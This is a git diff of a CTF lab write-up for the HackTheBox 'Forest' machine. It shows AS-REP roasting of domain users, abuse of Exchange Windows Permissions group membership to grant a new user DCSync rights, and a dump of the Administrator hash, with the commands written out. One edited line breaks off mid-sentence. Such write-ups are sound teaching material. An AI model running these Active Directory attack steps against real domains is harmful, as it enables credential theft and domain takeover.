@@ -63,7 +63,7 @@ santi
 
 ## Exploitation
 
-Performed an AS-REP Roast attack on the list of users, to find a service account `svc-alfresco` with Kerberos pre-authentication disabled.
+I used the `users.txt` list to exploit accounts with 
 ```bash
 nxc ldap 'FOREST' -u files/users.txt  -p '' -d 'htb.local' --asreproast files/roast.txt     
 
@@ -99,8 +99,6 @@ User flag was in `svc-alfresco`'s Desktop.
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> more ../Desktop/user.txt
 ```
-
-
 
 ## Privilege Escalation
 
@@ -141,7 +139,7 @@ RETURN p
 LIMIT 1000
 ``` 
 
-To reveal that the "`Exchange Windows Permissions`" group has `WriteDACL` over the domain, leaving it vulnerable to a "DCSync" attack.
+To reveal that the service account is apart of the "`Account Operators`" group, which has permission to add users to the "`Exchange Windows Permissions`" group. This group - usually for legitimate reasons - has `WriteDACL` over the domain, leaving it vulnerable to a "DCSync" attack.
 ![[Pasted image 20250615014133.png]]
 To perform the DCSync attack, I firstly created a new credential object and domain user account called "wither"
 ```powershell
@@ -155,7 +153,7 @@ Then added it to the "Exchange Windows Permissions" group.
 Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members wither
 ```
 
-So I could give it DCSync permissions.
+So I could then give it DCSync permissions. 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -PrincipalIdentity wither -Rights DCSync -TargetIdentity "DC=htb,DC=local" -Credential $Cred -Verbose
 
@@ -163,6 +161,8 @@ So I could give it DCSync permissions.
 Verbose: [Add-DomainObjectAcl] Granting principal CN=wither,CN=Users,DC=htb,DC=local 'DCSync' on DC=htb,DC=local
 ...
 ```
+>[!info] Important to note, `-Credential` using `wither`'s credential object was vital here for the attack to work, as I needed `Add-DomainObjectAcl` to run under the context of that account (as it was a member of "Exchange Windows Permissions" and thus had permission to modify ACLs) and not `svc-alfresco`.
+
 
 And use it to dump the `Administrator`'s password hash.
 ```bash
